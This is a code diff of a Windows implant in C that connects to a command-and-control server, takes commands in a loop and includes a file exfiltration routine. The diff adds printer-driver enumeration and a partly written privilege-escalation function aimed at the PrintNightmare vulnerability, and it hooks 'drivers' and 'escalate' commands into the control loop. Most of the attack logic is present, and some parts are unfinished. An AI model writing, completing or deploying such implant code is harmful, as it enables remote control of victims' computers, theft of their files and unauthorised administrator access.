@@ -4,9 +4,12 @@
 #include <malloc.h>
 #include <string.h>
 #include <shlwapi.h>
+#include <winspool.h>
 
 #pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "Pathcch.lib")
+#pragma comment(lib, "Winspool.lib")
 
 // Configurations
 #define SLEEP 1
@@ -85,7 +88,7 @@ DWORD exfil(char* path) {
     int status = 0;
 
     // Convert relative path to absolute path
-    if (path[0] != "C" || path[1] != ":") {
+    if (path[0] != 'C' || path[1] != ':') {
         sprintf(abs_path, "%s\\%s", pwd, path);
     }
     // Otherwise just use path as-is
@@ -131,6 +134,71 @@ end:
 
 
 
+// Returns list of driver structures
+// print: Whether to print all drivers or not
+DRIVER_INFO_2* getDrivers(BOOL print) {
+	DWORD numBytes;
+	DWORD numDrivers;
+	PBYTE drivers = NULL;
+
+	// Initial call will fail but fill in numBytes so we know how much memory to allocate
+	BOOL res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, 0, &numBytes, &numDrivers);
+
+	// Allocate memory and make the actual call now
+	drivers = (PBYTE) LocalAlloc(0, numBytes);
+	res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, numBytes, &numBytes, &numDrivers);
+	if (!res) {
+		printf("[!] Driver enumeration failed\n");
+		exit(1); // TODO handle better
+	}
+
+	if (print) {
+		for (int i = 0; i < numDrivers; i++) {
+			DRIVER_INFO_2 drv = *(DRIVER_INFO_2*)(drivers + i * sizeof(DRIVER_INFO_2));
+			printf("Name   : %s\n", drv.pName);
+			printf("Config : %s\n", drv.pConfigFile);
+			printf("Data   : %s\n", drv.pDataFile);
+			printf("Driver : %s\n", drv.pDriverPath);
+			printf("Version: %u\n", drv.cVersion);
+			printf("\n");
+		}
+	}
+	
+	return (DRIVER_INFO_2*) drivers;
+}
+
+
+
+// Attempts to gain administrator priveleges by using the Printer Nightmare CVE
+DWORD escalate(char* dll_path) {
+    // DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
+	// CHAR dll_path[1024];
+	// CHAR driver_path[1024];
+    int status;
+
+    // TODO: check registry first
+    HKEY hKey;
+    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
+    if (status != ERROR_SUCCESS) {
+        // send message back to c2 server saying that check failed. TODO: do we try anyways if it fails?
+    }
+
+    // Get value
+    DWORD val;
+    int size = 4;
+    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
+    if (status != ERROR_SUCCESS) {
+        // send message back to c2 server saying that registry check failed. TODO
+    }
+
+    // TODO finish
+
+
+    RegCloseKey(hKey);
+    return 0;
+
+}
+
 
 // cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
 // cl implant.c c2_net.c /Fe:implant.exe
@@ -147,6 +215,7 @@ int main() {
     if (!setup_comms()) {
         return 1;
     }
+    heap = GetProcessHeap();
 
     // Connect to C2 server (TODO: what to do if can't connect?)
     c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
@@ -160,15 +229,15 @@ int main() {
     GetCurrentDirectory(_MAX_PATH, pwd);
     c2_send(c2_sock, pwd, strlen(pwd));
 
-    // Get heap handle
-    heap = GetProcessHeap();
     
     while (TRUE) {
-        // Get data
+        // Read data from network buffer
         len = c2_recv(c2_sock, buffer, 511);
         if (len == SOCKET_ERROR)
             continue;
         c2_log("%s\n", buffer);
+
+
 
         // Main logic of implant functionality
         if (strncmp(buffer, "exit", 4) == 0) {
@@ -202,7 +271,12 @@ int main() {
             }   
         }
         else if(strncmp(buffer, "upload ", 6) == 0) {
-            
+            // falls more on the c2 server
+        }
+        else if(strncmp(buffer, "drivers", 7) == 0) {
+            getDrivers(TRUE);
+        }
+        else if(strncmp(buffer, "escalate", 8) == 0) {
         }
         // TODO: what else?
 
